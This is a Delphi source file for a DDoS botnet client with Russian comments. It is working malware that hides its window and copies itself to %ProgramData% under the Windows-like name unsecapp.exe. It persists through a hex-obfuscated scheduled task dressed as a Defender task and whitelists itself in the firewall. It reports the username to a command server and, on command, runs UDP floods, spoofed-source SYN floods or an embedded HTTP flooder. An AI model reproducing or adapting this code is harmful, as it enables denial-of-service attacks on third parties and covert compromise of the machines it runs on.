unit TCPClient;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms,  System.Win.ScktComp,Vcl.Dialogs, Vcl.StdCtrls, Winsock;

type
  TForm2 = class(TForm)
    Memo1: TMemo;
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

type
  TOThread = class(TThread)
  private
  protected
    procedure Execute; override;
  public
    Client: TClientSocket;
    constructor Create;
    destructor Destroy; override;
    procedure OnRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure OnError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure OnConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure OnDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure UpdateConnectionSynch;
  end;

type
  Tudp = record
    host: ansistring;
    port: integer;
    num: integer;
    delay: integer;
    size: integer;
  end;

type
  Tssyn = record
    TargetIP: string;
    TargetPort: integer;
    len: integer;
  end;

type
  TCP_HEADER = record
    th_sport: Word;
    th_dport: Word;
    th_seq: DWORD;
    th_ack: DWORD;
    th_lenres: Byte;
    th_flag: Byte;
    th_win: Word;
    th_sum: Word;
    th_urp: Word;
  end;

type
  IP_HEADER = record
    h_verlen: Byte;
    tos: Byte;
    total_len: Word;
    ident: Word;
    frag_and_flags: Word;
    ttl: Byte;
    proto: Byte;
    checksum: Word;
    sourceIP: LongWord;
    destIP: LongWord;
  end;

type
  PSD_HEADER = record
    saddr: DWORD;
    daddr: DWORD;
    mbz: Byte;
    ptcl: Byte;
    tcpl: WORD;
  end;


const
shell32 = 'shell32.dll';
kernel32  = 'kernel32.dll';
ws2_32 = 'ws2_32.dll';
maxproccess = 250;
CLOSE_SOCK = 0;
CONNECTING_SOCK = 1;
CONNECTED_SOCK = 2;
TIME_OUT = 10;
IP_HDRINCL = 2;
Header_SEQ = $19026695;
SEQ = $28376839;



Function Wow64DisableWow64FsRedirection(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
External kernel32 name 'Wow64DisableWow64FsRedirection';

function ShellExecuteW(hWnd: THandle; Operation, FileName, Parameters,
Directory: WideString; ShowCmd: Integer): HINST; stdcall;
external shell32 name 'ShellExecuteW';

function ExpandEnvironmentStrings(lpSrc: LPCWSTR; lpDst: LPWSTR; nSize: DWORD): DWORD; stdcall;
external kernel32 name 'ExpandEnvironmentStringsW';

function WSASocketA(af, wType, protocol: integer;lpProtocolInfo: pointer;g,
dwFlags: dword): integer;stdcall; external ws2_32;

function setsockopt( const s: TSocket; const level, optname: Integer; optval: PChar;
const optlen: Integer ): Integer; stdcall; external ws2_32;


var
  Form2: TForm2;
  OThread: TOThread;
  Ip, Port, IPst, Portst: AnsiString;
  IPATTACK, PORTATTACK, MINATTACK, METHODATTACK: AnsiString;
  udp: Tudp;
  syn: Tssyn;
  h1, h2, h3: cardinal;
  SendSEQ :Integer = 0;
  WFER: LongBool;


implementation

{$R *.dfm}
{$R winhost.RES}

constructor TOThread.Create;
begin
  inherited Create(false);
  self.FreeOnTerminate:=true;
  self.Priority:=tpNormal;
end;

destructor TOThread.Destroy;
begin
   inherited  Destroy;
   Client.Socket.Close;
   Self.Terminate;
end;

function HexArrToStr(const hexarr:array of string): Ansistring;
var
 i:Integer;
function HexToStr(hex: Ansistring): Ansistring;
var
i: Integer;
begin
for i:= 1 to Length(hex) div 2 do
begin
Result:= Result + AnsiChar(StrToInt('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
end;
end;
begin
 for i:= 0 to Length(hexarr)-1 do
 begin
 Result :=  HexToStr(AnsiString(hexarr[i]));
 end;
end;

procedure AutoRun();
const
// /c schtasks /create /tn "Microsoft\Windows\Windows Setting Factory\Microsoft Recovery\Common System File\Defender Setting Factory" /f /tr "
hs191:Array[0..138] of string=(
'2F','63','20','73','63','68','74','61','73','6B','73','20','2F','63','72',
'65','61','74','65','20','2F','74','6E','20','22','4D','69','63','72','6F',
'73','6F','66','74','5C','57','69','6E','64','6F','77','73','5C','57','69',
'6E','64','6F','77','73','20','53','65','74','74','69','6E','67','20','46',
'61','63','74','6F','72','79','5C','4D','69','63','72','6F','73','6F','66',
'74','20','52','65','63','6F','76','65','72','79','5C','43','6F','6D','6D',
'6F','6E','20','53','79','73','74','65','6D','20','46','69','6C','65','5C',
'44','65','66','65','6E','64','65','72','20','53','65','74','74','69','6E',
'67','20','46','61','63','74','6F','72','79','22','20','2F','66','20','2F',
'74','72','20','22');
// " /sc ONLOGON /rl HIGHEST
hs192:Array[0..24] of string=(
'22','20','2F','73','63','20','4F','4E','4C','4F','47','4F','4E','20','2F',
'72','6C','20','48','49','47','48','45','53','54');
// open
HOP:Array[0..3] of string=(
'6F','70','65','6E');
// cmd.exe
HCM:Array[0..6] of string=(
'63','6D','64','2E','65','78','65');
var
SP1,SP2,OP,CM:string;
begin
  SP1 := string(HexArrToStr(hs191));
  SP2 := string(HexArrToStr(hs192));
  OP := string(HexArrToStr(HOP));
  CM := string(HexArrToStr(HCM));
  // автозагрузка в планировщик заданий, исполняем команду в cmd
  if Wow64DisableWow64FsRedirection(WFER) then
    ShellExecuteW(0, OP, CM, PChar(SP1+ParamStr(0)+SP2), '', 0)
  else ShellExecuteW(0, OP, CM, PChar(SP1+ParamStr(0)+SP2), '', 0);
end;

procedure AddToFirewall(FileName:string);
const
// open
HOP:Array[0..3] of string=(
'6F','70','65','6E');
// cmd.exe
HCM:Array[0..6] of string=(
'63','6D','64','2E','65','78','65');
var
SP1,OP,CM:string;
begin
  OP := string(HexArrToStr(HOP));
  CM := string(HexArrToStr(HCM));
  SP1 := 'netsh advfirewall firewall add rule name="'+ChangeFileExt(ExtractFileName(FileName), '')+'" dir=in action=allow program="'+FileName+'" enable=yes';
  if Wow64DisableWow64FsRedirection(WFER) then
    ShellExecuteW(0, OP, CM, PChar(SP1), '', 0)
  else ShellExecuteW(0, OP, CM, PChar(SP1), '', 0);
end;

procedure ShellExecute(hWnd: THandle; Operation, FileName, Parameters, Directory: WideString; ShowCmd: Integer);
var
WFER: LongBool;
begin
if Wow64DisableWow64FsRedirection(WFER) then
ShellExecuteW(hWnd, Operation, FileName, Parameters, Directory, ShowCmd)
else ShellExecuteW(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
end;

function checksum(var Buffer; Size: integer): word;
type
  TWordArray = array[0..1] of word;
var
  lSumm: LongWord;
  iLoop: integer;
begin
  lSumm := 0;
  iLoop := 0;
  while Size > 1 do
  begin
    lSumm := lSumm + TWordArray(Buffer)[iLoop];
    inc(iLoop);
    Size := Size - SizeOf(word);
  end;
  if Size = 1 then
    lSumm := lSumm + Byte(TWordArray(Buffer)[iLoop]);
  lSumm := (lSumm shr 16) + (lSumm and $FFFF);
  lSumm := lSumm + (lSumm shr 16);
  Result := word(not lSumm);
end;

procedure ExtractRes(ResType, ResName, ResNewName : String);
var
Res : TResourceStream;
begin
Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
Res.SavetoFile(ResNewName);
FreeAndNil(Res);
end;

function GetWin(Comand: string): string;
var
  buff: array[0..$FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;


procedure udpth(p: pointer);
var
  sock: array[1..maxproccess] of TSocket;
  stat: array[1..maxproccess] of Byte;
  time: array[1..maxproccess] of Byte;
  wsa: WSAData;
  addr: Tsockaddr;
  x: integer;
  on_sock: LongInt;
  off_sock: LongInt;
  wfds_empty: Boolean;
  wfds: Tfdset;
  tv: Ttimeval;
  buf: array[1..4500] of char;
begin

  on_sock := 1;
  off_sock := 0;

  udp.size := 4500;

  udp.num := (udp.num * 60000) + GetTickCount; //convert to minute

  FillChar(Buf, udp.size, 0);
  WSAStartup($101, wsa);
  for x := 1 to maxproccess do
    stat[x] := CLOSE_SOCK;

  while (udp.num > GetTickCount) do
  begin

    for x := 1 to maxproccess do
    begin
      if stat[x] = CLOSE_SOCK then
      begin
        sock[x] := socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        time[x] := TIME_OUT;
        ioctlsocket(sock[x], FIONBIO, on_sock);
        addr.sin_family := AF_INET;
        addr.sin_port := htons(udp.port);
        addr.sin_addr.s_addr := inet_addr(pansichar(udp.host));
        connect(sock[x], addr, sizeof(addr));
        stat[x] := CONNECTING_SOCK;
      end;
    end;

    FD_ZERO(wfds);
    wfds_empty := true;
    for x := 1 to maxproccess do
    begin
      if stat[x] = CONNECTING_SOCK then
      begin
        FD_SET(sock[x], wfds);
        wfds_empty := false;
      end;
    end;

    if not wfds_empty then
    begin
      tv.tv_sec := 1;
      tv.tv_usec := 0;
      select(0, nil, @wfds, nil, @tv);
    end;

    for x := 1 to maxproccess do
    begin
      if stat[x] <> CLOSE_SOCK then
      begin
        dec(time[x]);
        if time[x] = 0 then
        begin
          stat[x] := CLOSE_SOCK;
          ioctlsocket(sock[x], FIONBIO, off_sock);
          closesocket(sock[x]);
        end;
      end;

      if stat[x] = CONNECTING_SOCK then
      begin
        if FD_ISSET(sock[x], wfds) then
          stat[x] := CONNECTED_SOCK;
      end;

      if stat[x] = CONNECTED_SOCK then
      begin
        FD_CLR(sock[x], wfds);
        send(sock[x], buf[1], udp.size, 0);
        stat[x] := CLOSE_SOCK;
        ioctlsocket(sock[x], FIONBIO, off_sock);
        closesocket(sock[x]);
      end;
    end;
    Application.ProcessMessages;
  end;
  Form2.Memo1.Clear;
  ExitThread(0);
end;


procedure synackth(p: pointer);
var
  WSAData: TWSAData;
  sock: TSocket;
  Remote: TSockAddr;
  ipHeader: IP_HEADER;
  tcpHeader: TCP_HEADER;
  psdHeader: PSD_HEADER;
  ErrorCode, bOpt, counter, FakeIpNet, FakeIpHost, datasize: integer;
  Buf: array[0..127] of char;
  FromIP: string;
begin


  if WSAStartup(MAKEWORD(2, 2), WSAData) <> 0 then
    exit;
  sock := WSASocketA(AF_INET, SOCK_RAW, IPPROTO_RAW, nil, 0, {WSA_FLAG_OVERLAPPED}0);
  if sock = INVALID_SOCKET then
    exit;

  bOpt := 1;

  if setsockopt(sock, IPPROTO_IP, IP_HDRINCL, @bOpt, SizeOf(bOpt)) = SOCKET_ERROR then
    exit;


  Randomize;
  FillChar(Remote, sizeof(Remote), #0);
  Remote.sin_family := AF_INET;

  Remote.sin_addr.S_addr := inet_addr(PAnsiChar(ipattack));
  Remote.sin_port := htons(StrToInt(portattack));


  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' + Inttostr(Random(254) + 1);
  FakeIpNet := inet_Addr(PAnsiChar(FromIP));

  FakeIpHost := ntohl(FakeIpNet);


  ipHeader.h_verlen := (4 shl 4) or (sizeof(ipHeader) div sizeof(LongWord));
  ipHeader.total_len := htons(sizeof(ipHeader) + sizeof(tcpHeader));
  ipHeader.ident := 1;
  ipHeader.tos := 0;
  ipHeader.frag_and_flags := 0;
  ipHeader.ttl := 128;
  ipHeader.proto := IPPROTO_TCP;
  ipHeader.checksum := 0;
  ipHeader.sourceIP := htonl(FakeIpHost + SendSEQ);

  ipHeader.destIP := inet_addr(PAnsiChar(ipattack));


  tcpHeader.th_sport := htons(Random(65536) + 1);
  tcpHeader.th_dport := Remote.sin_port;

  tcpHeader.th_seq := htonl(SEQ + SendSEQ);
  tcpHeader.th_ack := 0;
  tcpHeader.th_lenres := (sizeof(tcpHeader) shr 2 shl 4) or 0;
  tcpHeader.th_flag := 2;
  tcpHeader.th_win := htons(16384);
  tcpHeader.th_urp := 0;
  tcpHeader.th_sum := 0;


  psdHeader.saddr := ipHeader.sourceIP;
  psdHeader.daddr := ipHeader.destIP;
  psdHeader.mbz := 0;
  psdHeader.ptcl := IPPROTO_TCP;
  psdHeader.tcpl := htons(sizeof(tcpHeader));

  udp.num := (udp.num * 60000) + GetTickCount; //convert to minute


  while (udp.num > GetTickCount) do
  begin

    Application.ProcessMessages;
    Sleep(1);
    Application.ProcessMessages;

    for counter := 0 to 10239 do
    begin

      FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' + Inttostr(Random(254) + 1);
      FakeIpNet := inet_Addr(PAnsiChar(FromIP));

      FakeIpHost := ntohl(FakeIpNet);

      inc(SendSEQ);
      if (SendSEQ = 65536) then
        SendSEQ := 1;

      ipHeader.checksum := 0;
      ipHeader.sourceIP := htonl(FakeIpHost + SendSEQ);

      tcpHeader.th_seq := htonl(SEQ + SendSEQ);
      tcpHeader.th_sum := 0;

      psdHeader.saddr := ipHeader.sourceIP;

      FillChar(Buf, SizeOf(Buf), #0);

      CopyMemory(@Buf[0], @psdHeader, SizeOf(psdHeader));
      CopyMemory(@Buf[SizeOf(psdHeader)], @tcpHeader, SizeOf(tcpHeader));
      TCPHeader.th_sum := checksum(Buf, SizeOf(psdHeader) + SizeOf(tcpHeader));

      CopyMemory(@Buf[0], @ipHeader, SizeOf(ipHeader));
      CopyMemory(@Buf[SizeOf(ipHeader)], @tcpHeader, SizeOf(tcpHeader));
      FillChar(Buf[SizeOf(ipHeader) + SizeOf(tcpHeader)], 4, #0);
      datasize := SizeOf(ipHeader) + SizeOf(tcpHeader);
      ipHeader.checksum := checksum(Buf, datasize);

      CopyMemory(@Buf[0], @ipHeader, SizeOf(ipHeader));

      ErrorCode := sendto(sock, buf, datasize, 0, Remote, sizeof(Remote));
      if ErrorCode = SOCKET_ERROR then
      begin
      //  exit;
       Application.ProcessMessages;
      end;
    //  Form1.Memo111.Lines.Add('атака идёт');
    end;

    Application.ProcessMessages;
  end;

  closesocket(sock);
  WSACleanup();

  Form2.Memo1.Clear;
  ExitThread(0);
end;

procedure SleepTime(t: Integer);
var
  intw: Integer;
begin
  intw := 0;
  while intw < t do
  begin
    inc(intw);
    Sleep(1);
    Application.ProcessMessages;
  end;
end;

procedure TOThread.UpdateConnectionSynch;
begin
  if Client.Active = True then Form2.Caption := '[+] Connection established ' +
  Client.Socket.RemoteAddress + ':' + IntToStr(Client.Socket.RemotePort)
  else Form2.Caption := '[-] No connection.';
end;

procedure TOThread.Execute;
begin

  Client := TClientSocket.Create(nil);
  Client.OnRead := OnRead;
  Client.OnError := OnError;
  Client.OnConnect := OnConnect;
  Client.OnDisconnect := OnDisconnect;
  //запускаем бесконечный цикл
  while not Self.Terminated do
  begin
      try
        //если сервер отключён то мы пробуем подключиться к нему
        if Client.Socket.Connected = False then
        begin
          Client.Address := string(Ip);
          Client.port := StrToInt(string(Port));
          Client.Active := True;
        end;
      finally
        Application.ProcessMessages;
      end;

    //Ожидаем интервал 5 секунд
    SleepTime(15000);

  end;
end;


procedure TOThread.OnRead(Sender: TObject; Socket: TCustomWinSocket);
var
CommandServer: Ansistring;
f: TextFile;
begin
  CommandServer := Socket.ReceiveText;

  if Pos('#-#DD#-#', string(CommandServer)) <> 0 then
  begin

    Form2.Memo1.Text := string(CommandServer);
    METHODATTACK := Form2.Memo1.Lines.Strings[1];
    MINATTACK := Form2.Memo1.Lines.Strings[2];
    IPATTACK := Form2.Memo1.Lines.Strings[3];
    PORTATTACK := Form2.Memo1.Lines.Strings[4];

    if METHODATTACK = 'UDP' then
    begin
      udp.host := string(IPATTACK);
      udp.port := StrToInt(string(PORTATTACK));
      udp.num := StrToInt(string(MINATTACK));
      createthread(nil, 128, @udpth, self, 0, h1);
    end;

    if METHODATTACK = 'SYN/ACK' then
    begin
      udp.host := string(IPATTACK);
      udp.port := StrToInt(string(PORTATTACK));
      udp.num := StrToInt(string(MINATTACK));
      createthread(nil, 128, @synackth, self, 0, h2);
    end;

    if METHODATTACK = 'GET' then
    begin

      try
      if FileExists(ExtractFilePath(ParamStr(0))+'winhost.exe') = False then
      begin
       ExtractRes('EXEFILE', 'winhost', ExtractFilePath(ParamStr(0))+'winhost.exe');
      end;
      except
        Application.ProcessMessages;
      end;

      //добавить нашу программу в исключение фаервола
       AddToFirewall(PChar(ExtractFilePath(ParamStr(0))+'winhost.exe'));

      try
        assignfile(f,ExtractFilePath(ParamStr(0))+'\cmd.bat');
        rewrite(f);
        writeln(f, 'winhost.exe --urlname "'+IPATTACK+'" --portname "'+PORTATTACK+'" --timename "'+MINATTACK+'"');
        writeln(f,'del %0');
        closefile(f);
      except
        Application.ProcessMessages;
      end;

      try
        ShellExecute(0, 'open', PChar(ExtractFilePath(ParamStr(0))+'\cmd.bat'), '', PChar(ExtractFilePath(ParamStr(0))), 0);
      except
        Application.ProcessMessages;
      end;

    end;

  end;

end;

procedure TOThread.OnError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TOThread.OnConnect(Sender: TObject; Socket: TCustomWinSocket);
var
UN: AnsiString;
begin
//обновляем заголовок нашей формы
Synchronize(UpdateConnectionSynch);
//При подключении к серверу высылаем серверу наш локальный IP адрес и имя пользователя
try
  //имя пользователя
  UN := AnsiString(GetEnvironmentVariable('username'));
  Socket.SendText('INFO#' + AnsiString(Socket.LocalAddress) +'#'+AnsiString(UN)+'#');
finally
 Application.ProcessMessages;
end;
end;


procedure TOThread.OnDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  //обновляем заголовок нашей формы
  Synchronize(UpdateConnectionSynch);
end;


procedure TForm2.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  //При закрытии формы разрушаем поток
  if  OThread <>  nil  then
  begin
    OThread.Client.Active := False;
    FreeAndNil(OThread.Client);
    OThread.Terminate ;
    OThread  :=  nil;
  end
end;

procedure TForm2.FormCreate(Sender: TObject);
const
// open
HOPN:Array[0..3] of string=(
'6F','70','65','6E');
//unsecapp.exe
HFNAME:Array[0..11] of string=(
'75','6E','73','65','63','61','70','70','2E','65','78','65');
// %ProgramData%\App
HPath:Array[0..16] of string=(
'25','50','72','6F','67','72','61','6D','44','61','74','61','25','5C','41',
'70','70');
var
Path:string;
OPN,FNAME: string;
u:Integer;
begin
    Application.ShowMainForm:=false;

    Ip := AnsiString('999999999999999999999999999999999999999999999999999999999999');
    Port := AnsiString('999999999999999999999999999999999999999999999999999999999999');

    for u := 1 to Length(Ip) do
    if Ip[u] <> '' then
     Ipst := Ipst + Ip[u]
     else Break;

    for u := 1 to Length(Port) do
    if Port[u] <> '' then
     Portst := Portst + Port[u]
     else Break;

    Ip := Ipst;
    Port := Portst;


    FNAME := string(HexArrToStr(HFNAME));
    Path := string(HexArrToStr(HPath));
    Path := GetWin(Path);
  // если файла нет на месте %ProgramData%\App\unsecapp.exe
    if FileExists(PChar(Path+'\'+FNAME)) = False then
    begin
      //создаём директорию %ProgramData%\App
      CreateDirectory(PChar(Path), nil);
      //копируем себя в %ProgramData%\App\unsecapp.exe
      CopyFile(PChar(ParamStr(0)), PChar(Path+'\'+FNAME), True);
      //запускаем %ProgramData%\App\unsecapp.exe
      OPN := string(HexArrToStr(HOPN));
      if Wow64DisableWow64FsRedirection(WFER) then
      ShellExecuteW(0, OPN, PChar(Path+'\'+FNAME), '', '', 0)
      else ShellExecuteW(0, OPN, PChar(Path+'\'+FNAME), '', '', 0);




    end;
    //завершаем себя если мы не являемся unsecapp.exe
    if Pos(FNAME,PChar(ParamStr(0))) = 0 then
    begin
      asm
        call Exitprocess;
      end;
    end;

    //если unsecapp.exe есть в строке где указан путь до нашего файла то действуем
    if Pos(FNAME,PChar(ParamStr(0))) <> 0 then
    begin
      //нужны права администратора что бы добавить в автозагрузку
      AutoRun();

//      //добавить нашу программу в исключение фаервола
       AddToFirewall(PChar(Path+'\'+FNAME));




    //Создаём поток
      if OThread = nil then
      begin
       OThread := TOThread.Create;
       OThread.Priority:=tpNormal;
      end;
    end;
end;

procedure TForm2.FormShow(Sender: TObject);
begin
ShowWindow(Application.Handle, SW_HIDE);
end;

end.
